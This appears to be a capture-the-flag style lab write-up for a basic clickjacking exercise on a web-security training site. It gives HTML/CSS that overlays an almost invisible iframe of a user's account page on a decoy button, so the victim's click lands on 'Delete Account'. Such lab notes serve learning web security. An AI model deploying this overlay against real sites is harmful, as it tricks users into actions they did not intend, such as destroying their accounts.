# 1 - Basic With CSRF Token

### Notes

We need to craft an HTML page with a "click" button overlaid over an iframe containing the user's "My Account" page. The button should be absolutely positioned over the iframe, with a lower z-index, such that when the user clicks the button they actually click the "Delete Account" button beneath it.

```html
<head>
  <style>
    #decoy_website {
      position: absolute;
      width: 300px;
      height: 400px;
      z-index: 1;
    }

    #decoy_website button {
      left: 50px;
      position: absolute;
      top: 486px;
    }

    #target_website {
      position: relative;
      width: 128px;
      height: 1200px;
      opacity: 0.00001;
      z-index: 2;
    }
  </style>
</head>

<body>
  <div id="decoy_website">
    <button>click</button>
  </div>
  <iframe id="target_website"
    src="https://0aeb005a04d050cec0cf7cbb00fa00ce.web-security-academy.net/my-account"></iframe>
</body>
```
